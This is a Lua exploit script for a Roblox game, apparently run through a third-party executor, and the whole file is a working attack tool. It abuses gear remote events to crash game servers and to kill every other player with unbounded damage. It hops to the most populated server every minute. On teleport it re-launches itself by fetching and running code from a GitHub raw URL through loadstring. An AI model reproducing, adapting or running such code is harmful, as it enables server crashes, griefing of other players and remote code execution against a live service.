if not game:IsLoaded() then game.Loaded:Wait() end
if CatalogAddict then return end
pcall(function() getgenv().CatalogAddict = true end)
local Players             = game:GetService("Players")
local RunService          = game:GetService("RunService")
local Workspace           = game:GetService("Workspace")
local StarterGui          = game:GetService("StarterGui")
local TextChatService     = game:GetService("TextChatService")
local TeleportService     = game:GetService("TeleportService")
local ReplicatedStorage   = game:GetService("ReplicatedStorage")
local VirtualUser         = game:GetService("VirtualUser")
local Stats               = game:GetService("Stats")
local HttpService         = game:GetService("HttpService")
local LocalPlayer         = Players.LocalPlayer
local ServerUrl           = "https://games.roblox.com/v1/games/26838733/servers/0"
local HttpRequest         = syn and syn.request or http and http.request or http_request or request or httprequest
local queueteleport       = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
local ServerCrashed       = false
local timeOutTimes        = 0
local LastPacketsRecieved = 0
local BlindGuisTable      = { ScreenFog = true, DarknessGui = true, VolleyballScreenGui = true, FlashBangEffect = true }
local TargetPlayer        = {}
local gearTable           = {
    ["Diamond Blade Sword"] = { ["name"] = "Diamond Blade Sword", ["id"] = 173755801 },
    ["HadesStaff"] = { ["name"] = "HadesStaff", ["id"] = 69210321 },
    ["Charming Blade"] = { ["name"] = "Charming Blade", ["id"] = 106064277 },
    ["CloverHammer"] = { ["name"] = "CloverHammer", ["id"] = 108153884 },
    ["2018BloxyAward"] = { ["name"] = "2018BloxyAward", ["id"] = 1469987740 },
    ["SpaceSword"] = { ["name"] = "SpaceSword", ["id"] = 170903610 },
    ["Balligator"] = { ["name"] = "Balligator", ["id"] = 292969458 },
    ["KorbloxSwordAndShield"] = { ["name"] = "KorbloxSwordAndShield", ["id"] = 68539623 },
    ["StepGun"] = { ["name"] = "StepGun", ["id"] = 34898883 },
    ["SuperFlyGoldBoombox"] = { ["name"] = "SuperFlyGoldBoombox", ["id"] = 212641536 },
    ["RocketJumper"] = { ["name"] = "RocketJumper", ["id"] = 169602103 },
    ["SorcusSword"] = { ["name"] = "SorcusSword", ["id"] = 53623322 },
    ["StaffOfPitFire"] = { ["name"] = "StaffOfPitFire", ["id"] = 49491808 }
}
local whitelist           = {
    Head             = true,
    Torso            = true,
    ["Left Arm"]     = true,
    ["Right Arm"]    = true,
    ["Left Leg"]     = true,
    ["Right Leg"]    = true,
    UpperTorso       = true,
    LowerTorso       = true,
    LeftUpperArm     = true,
    LeftLowerArm     = true,
    LeftHand         = true,
    RightUpperArm    = true,
    RightLowerArm    = true,
    RightHand        = true,
    LeftUpperLeg     = true,
    LeftLowerLeg     = true,
    LeftFoot         = true,
    RightUpperLeg    = true,
    RightLowerLeg    = true,
    RightFoot        = true,
    HumanoidRootPart = true,
    Humanoid         = true,
    Health           = true,
    ForceField       = true
}


local RemoveServer = [==[
if not ServerToAvoid then return end;
if #ServerToAvoid < 5 then;
table.remove(tableofnumber,1);
end
]==]

local LoadServersCrashed = [==[
if ServerToAvoid then;
ServerToAvoid = {"kamila"};
end
]==]

local function lobotomy(character)
    if not character then return end
    for _, v in pairs(character:GetChildren()) do
        if not whitelist[v.Name] then
            pcall(function() v:Destroy() end)
        end
    end
end


pcall(function()
    task.spawn(function()
        TextChatService.TextChannels.RBXGeneral:SendAsync("ごめんなさい")
    end)
end)

local function getServers()
    local serversFound = {}
    local Response
    local success      = pcall(function()
        Response = HttpRequest({
            Url = ServerUrl,
            Method = "Get",
            Headers = { ['Content-Type'] = 'application/json' },
        })
    end)
    if success then
        local servers = HttpService:JSONDecode(Response.Body)
        local data    = servers["data"]
        if data then
            for i, v in pairs(data) do
                serversFound[v["id"]] = v["playing"]
            end
        end
    end
    return serversFound
end

local function HopToBiggestServer()
    local serverToHop = nil
    local max = 9
    local biggestServerPlayers = 0
    for i, v in pairs(getServers()) do
        if not (v > max or i == game.JobId) then
            if v > biggestServerPlayers then
                biggestServerPlayers = v
                serverToHop = i
            end
        end
    end
    if serverToHop ~= nil then
        TeleportService:TeleportToPlaceInstance(26838733, serverToHop)
    end
end

task.spawn(function()
    while task.wait(60) do
        pcall(function()
            HopToBiggestServer()
        end)
    end
end)


local function RemoveFromList(List, Thing)
    local index = TargetPlayer.find(List, Thing)
    if not index then return end
    TargetPlayer.remove(List, index)
end

local function crashfunction() --thanks for leaking inter crash, now my script is finished!
    local Character = LocalPlayer.Character
    local Backpack = LocalPlayer:FindFirstChild("Backpack")
    if not (Character and Backpack) then return end
    local AligatorGear = Backpack:FindFirstChild("Balligator") or Character:FindFirstChild("Balligator")
    local Intergalatic = Backpack:FindFirstChild("SpaceSword") or Character:FindFirstChild("SpaceSword")
    if not (AligatorGear and Intergalatic) then return end
    if AligatorGear.Parent == Backpack then
        AligatorGear.Parent = Character
    end
    if Intergalatic.Parent == Backpack then
        Intergalatic.Parent = Character
    end
    AligatorGear:WaitForChild("Remote", 0.4):WaitForChild("Spawn", 0.4):InvokeServer()
    local aligator = Character:FindFirstChildOfClass("Model")
    local handle = aligator:FindFirstChild("Handle")
    if handle then
        handle.Anchored = true
    end
    aligator:PivotTo(CFrame.new(Vector3.new(8610111412132831051081081215851, 8610111412132831051081081215851,
        8610111412132831051081081215851)))
    Intergalatic:WaitForChild("ControlFunction", 0.4):InvokeServer("KeyDown", "q")
end


local function GetCharacterAndBackpack()
    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local Backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack", 1)
    return Character, Backpack
end

local function GetDiamondRemote()
    local char, backpack = GetCharacterAndBackpack()
    if not (char and backpack) then return nil end
    local sword = backpack:FindFirstChild("Diamond Blade Sword") or char:FindFirstChild("Diamond Blade Sword")
    if not sword then return nil end
    local GearScript = sword:FindFirstChildOfClass("Script")
    if not GearScript then return nil end
    local remote = GearScript:FindFirstChildOfClass("RemoteFunction")
    return remote
end


local function isAlive(humanoid)
    return (humanoid and (humanoid.Health > 0 or humanoid.Health ~= humanoid.Health)) or false
end

local function isAnchored(Character)
    local theirTorso = Character:FindFirstChild("Torso") or Character:FindFirstChild("UpperTorso")
    return (theirTorso and theirTorso.Anchored or Character:FindFirstChild("DrumKit") ~= nil)
end

local function IsGodMode(Character)
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    return (Humanoid and (Character:FindFirstChild("ForceField") or Humanoid.Health ~= Humanoid.Health or Humanoid.Health == math.huge or Character:FindFirstChild("DragonSword&Shield") ~= nil))
end


local PlatformCooldown = false
local function getPlatformShooter()
    local Character, Backpack = GetCharacterAndBackpack()
    if not (Character and Backpack) then return end
    local PlatformGun = Backpack:FindFirstChild("StepGun") or Character:FindFirstChild("StepGun")
    if not PlatformGun then return end
    local ShootEvent = PlatformGun:FindFirstChildOfClass("RemoteEvent")
    if not ShootEvent then return end
    return Character, Backpack, PlatformGun, ShootEvent
end

local function LegacyPlatformKill(char) --despite the legacy name, it is actually brand new
    if PlatformCooldown then return end
    local Char, Backpack, PlatformGun, ShootEvent = getPlatformShooter()
    if not (Char and Backpack and PlatformGun and ShootEvent) then return end
    local myTorso = Char:FindFirstChild("UpperTorso") or Char:FindFirstChild("Torso")
    if not myTorso then return end
    local targetCharacter = char
    local targetTorso = targetCharacter:FindFirstChild("UpperTorso") or targetCharacter:FindFirstChild("Torso")
    if not targetTorso then return end
    local targetHead = targetCharacter:FindFirstChild("Head")
    if not targetHead then return end
    task.spawn(function()
        targetHead.CanCollide = false
        targetHead.Anchored = true
        targetHead.Size = Vector3.new(50, 50, 50)
        targetHead.Transparency = 1
        targetCharacter:PivotTo(myTorso.CFrame * CFrame.new(0, 4, 6))
    end)
    if PlatformGun.Parent == Backpack then
        PlatformGun.Parent = Char
    end
    ShootEvent:FireServer(targetTorso.Position)
    if PlatformGun.Parent == Char then
        PlatformGun.Parent = Backpack
    end
    task.spawn(function()
        PlatformCoolDown = true
        task.wait(0.5)
        PlatformCoolDown = false
    end)
end

local function selfHarm()
    local char = LocalPlayer.Character
    if char then
        local humanoid = char:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
    end
end

local function GetRocketRemote()
    local Character, backpack = GetCharacterAndBackpack()
    if not (Character and backpack) then return nil end
    local Rocket = backpack:FindFirstChild("RocketJumper") or Character:FindFirstChild("RocketJumper")
    if not Rocket then return nil end
    local RocketRemoteEvent = Rocket:FindFirstChildOfClass("RemoteEvent")
    return RocketRemoteEvent
end

local function checkPackets()
    local newPacket = Stats.DataReceiveKbps
    if newPacket ~= LastPacketsRecieved then
        LastPacketsRecieved = newPacket
        timeOutTimes = 0
    else
        timeOutTimes = timeOutTimes + 1
    end
end

local hitboxsize = Vector3.new(60, 60, 60)
local cloudname = LocalPlayer.Name .. "'s Cloud"
local Cloud = Workspace:FindFirstChild(cloudname)
if not Cloud then return end
local union = Cloud:FindFirstChild("Union")
if not union then return end
local cloneName = LocalPlayer.Name .. "'s CloneUnion"
local clone = union:Clone()
clone.Parent = Workspace
clone.CanCollide = false
clone.Size = hitboxsize
clone.CFrame = union.CFrame
clone.CanQuery = false
clone.Transparency = 1
clone.Name = cloneName
local myff = Cloud:FindFirstChild("ForceField")
if myff then
myff:Destroy()
end

local param = OverlapParams.new()
param.FilterDescendantsInstances = { Cloud }
param.FilterType = Enum.RaycastFilterType.Exclude

local function DeleteBatSwordUsers()
    local playersNearMe = Workspace:GetPartBoundsInBox(clone.CFrame, hitboxsize, param)
    local tableTokill = {}
    for _, v in pairs(playersNearMe) do
        local player = Players:GetPlayerFromCharacter(v.Parent)
        if player ~= LocalPlayer and not table.find(tableTokill, v.Parent) then
            table.insert(tableTokill, v.Parent)
        end
    end
    for i = 1, #tableTokill do
        local Batman = tableTokill[i]
        local batsword = Batman:FindFirstChild("BatKnightBatSword")
        if batsword then
            Batman:Destroy()
        end
    end
end


local function MainLoop()
    pcall(function()
        task.spawn(function()
            selfHarm()
        end)
        task.spawn(function()
            pcall(crashfunction)
        end)
        task.spawn(function()
            local DiamondRemote = GetDiamondRemote()
            local RocketRemoteEvent = GetRocketRemote()
            if not (RocketRemoteEvent or DiamondRemote) then return end
            for i = 1, #TargetPlayer do
                task.spawn(function()
                    local plr = TargetPlayer[i]
                    if not plr then return end
                    local TargetCharacter = plr.Character

                    if not TargetCharacter then return end

                    local humanoid = TargetCharacter:FindFirstChildOfClass("Humanoid")

                    if not isAlive(humanoid) then return end

                    task.spawn(function()
                        if DiamondRemote then
                            DiamondRemote:InvokeServer(7, humanoid, math.huge)
                        end
                    end)

                    task.spawn(function()
                        if IsGodMode(TargetCharacter) then
                            if isAnchored(TargetCharacter) then
                                DeleteBatSwordUsers()
                                return
                            end
                            LegacyPlatformKill(TargetCharacter)
                        else
                            task.spawn(function()
                                if RocketRemoteEvent then
                                    local head = TargetCharacter:FindFirstChild("Head")
                                    if not head then return end
                                    local StartingPosition = head.Position
                                    RocketRemoteEvent:FireServer(StartingPosition - Vector3.new(0, 1, 0),
                                        StartingPosition)
                                end
                            end)
                        end
                    end)
                end)
            end
        end)
    end)
end


task.spawn(function()
    local GetPlayers = Players:GetPlayers()
    if #GetPlayers == 1 then
        pcall(function()
            HopToBiggestServer()
        end)
    end
    for i = 1, #GetPlayers do
        task.spawn(function()
            local plr = GetPlayers[i]
            if plr ~= LocalPlayer then
                table.insert(TargetPlayer, plr)
            end
        end)
    end
end)

Players.PlayerAdded:Connect(function(plr)
    task.wait()
    task.spawn(function()
        table.insert(TargetPlayer, plr)
    end)
end)


task.spawn(function()
    task.spawn(function()
        while (timeOutTimes < 10) do
            task.wait(1)
            checkPackets()
        end
    end)
    while (timeOutTimes < 10) do
        task.wait(0.1)
        pcall(function()
            task.spawn(MainLoop)
        end)
    end
    ServerCrashed = true
    print("Server Crashed.")
end)

local function ToggleAsset(id)
    ReplicatedStorage:FindFirstChild("Remotes"):FindFirstChild("ToggleAsset"):InvokeServer(id)
end

ToggleAsset(gearTable["Balligator"]["id"])
ToggleAsset(gearTable["SpaceSword"]["id"])
ToggleAsset(gearTable["Diamond Blade Sword"]["id"])
ToggleAsset(gearTable["StepGun"]["id"])
ToggleAsset(gearTable["RocketJumper"]["id"])


LocalPlayer.OnTeleport:Connect(function(State)
    if queueteleport then
        queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/SillyVoices/CatalogMainScript/main/TrashCrashBot.lua'))()")
    end
end)

task.spawn(function() --anti afk script
    pcall(function()
        task.wait(60)
        Players.LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end)
end)
